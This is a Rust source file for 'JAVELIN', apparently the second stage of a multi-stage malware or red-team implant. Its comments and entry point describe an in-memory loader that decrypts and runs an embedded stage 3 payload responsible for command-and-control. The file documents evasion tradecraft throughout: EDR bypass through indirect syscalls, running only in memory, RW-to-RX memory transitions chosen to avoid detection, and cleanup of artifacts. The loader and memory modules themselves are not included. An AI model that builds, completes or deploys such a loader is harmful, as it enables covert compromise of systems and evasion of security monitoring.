//! Stage 2: JAVELIN - In-Memory Loader with Decryption
//!
//! **Purpose**: Acts as an in-memory loader that decrypts and executes Stage 3
//!
//! **Why this stage exists**:
//! - Provides a clean separation between initial dropper and final payload
//! - All operations happen in memory (no disk writes)
//! - Handles payload decryption (XOR/AES compatible with existing crypto)
//! - Manages memory allocation with proper RW → RX transitions
//! - Cleans up artifacts after execution
//!
//! **OPSEC Considerations**:
//! - Runs entirely in memory (triggered by ESTER, never touches disk itself)
//! - Uses indirect syscalls via dinvk for memory operations (EDR bypass)
//! - Implements memory zeroing after use
//! - RW → RX memory transitions (not suspicious RWX)
//!
//! **Separation of Responsibilities**:
//! - JAVELIN does NOT connect to C2 directly
//! - JAVELIN only loads and executes Stage 3 (Stage0)
//! - Stage0 is responsible for C2 communication

// Note: JAVELIN is designed to be called from ESTER, not run standalone
// It can be compiled as both a library and binary for testing purposes

mod crypto;
mod loader;
mod memory;

pub use crypto::{decrypt_payload, CryptoAlgorithm};
pub use loader::load_stage3;
pub use memory::{allocate_rwx, cleanup_memory, transition_rx};

/// Main entry point for JAVELIN when executed from memory
///
/// This function is called by ESTER after JAVELIN is loaded into memory
///
/// **Execution flow**:
/// 1. Locate embedded Stage 3 (Stage0) payload
/// 2. Decrypt Stage 3 using configured algorithm
/// 3. Allocate memory for Stage 3
/// 4. Execute Stage 3 in memory
/// 5. Clean up artifacts
#[no_mangle]
pub extern "C" fn javelin_main() -> i32 {
    #[cfg(feature = "dev")]
    println!("[JAVELIN] Stage 2 initializing...");

    // Execute Stage 3 loading sequence
    match load_stage3() {
        Ok(_) => {
            #[cfg(feature = "dev")]
            println!("[JAVELIN] Stage 3 loaded successfully");
            0
        }
        Err(e) => {
            #[cfg(feature = "dev")]
            eprintln!("[JAVELIN] Failed to load Stage 3: {:?}", e);
            1
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_crypto_roundtrip() {
        let data = b"Hello, JAVELIN!";
        let key = b"test_key_32_bytes_long_enough!!";

        // Test XOR
        let encrypted = crypto::xor_encrypt(data, key);
        let decrypted = crypto::xor_encrypt(&encrypted, key);
        assert_eq!(decrypted, data.to_vec());
    }
}
